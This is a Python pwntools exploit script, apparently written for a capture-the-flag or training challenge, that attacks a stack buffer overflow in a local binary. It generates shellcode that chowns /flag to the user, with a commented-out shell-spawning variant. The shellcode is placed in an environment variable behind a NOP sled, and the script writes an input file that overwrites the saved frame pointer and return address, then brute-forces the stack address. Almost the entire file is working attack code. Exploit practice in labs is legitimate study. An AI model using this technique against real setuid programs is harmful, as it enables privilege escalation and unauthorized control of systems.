import os
import sys
from pwn import *

def calculate():
    global sp,pfile,rbp,rbpv,fidx,sc
    # sp = 0x7fffffffe250
    pfile= sp+0x10
    rbp = pfile+0x110
    rbpv=rbp+0x20
    rip = (rbpv & 0xFFFFFFFFFFFFFF00) + 8
    fidx = rip - pfile

def getCode():
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    # sc = shellcraft.execve(path="/bin//sh", argv=["/bin//sh"])
    sc = shellcraft.execve(path="/bin/chown", argv=["/bin/chown","hacker","/flag"])
    return asm(sc)

def setEvn4SC(value:bytes):
    data=[]
    for i in range(0,1024*10): #write padding 10K
        data.append(0x90)
    for b in value: #write shellcode
        data.append(b)
    os.environ['SHELLCODE']=str(bytes(data)).replace("b'","").replace("'","")
    
def genOFFile():
    global sp,pfile,rbp,rbpv,rbpv2,fidx,sc
    tlen = 272
    addrIdx = fidx #key point
    addr =sc #shellcode address.key point
    data =[]
    for i in range(0,tlen):
        data.append(0x65)
    bs = addr.to_bytes(8,'little',signed=False)
    print(f"addr len{len(bs)}\n")
    for i in range(0,8):
         data[addrIdx+i-8]=0 #write bsp value 0
    for i in range(0,8):
        data[addrIdx+i]=bs[i] #write return address
    f = open("/home/hacker/input42", mode='wb+')
    bs = bytes(data)
    f.write(bs)
    f.close()
    print(f"数据生成成功,共{len(data)}个字节.")
    return bs

if __name__=='__main__':
    sp = int(sys.argv[1],16)
    # sp = 0x7fffffff4390
    sc = sp
    calculate()
    setEvn4SC(getCode())
    
    main = "/challenge/main fffff <  /home/hacker/input42"
    while sc<0x7FFFFFFFFFFF:
        sc+=0x400
        genOFFile()
        print("sp:%x,pfile:%x,rbp:%x,rbpv:%x,fidx:%x,sc:%x" % (sp,pfile,rbp,rbpv,fidx,sc))
        os.system("/bin/sh")
        cmd = raw_input('按回车继续，输入q回车退出.')
        print(cmd)
        if cmd != b'\n':
            break
        
        #os.system(main)
        # f = os.popen(main,'r',1)
        # data = f.buffer.read()
        # print(data)
        # f.close()
        # sleep(1)
    print("执行失败!")
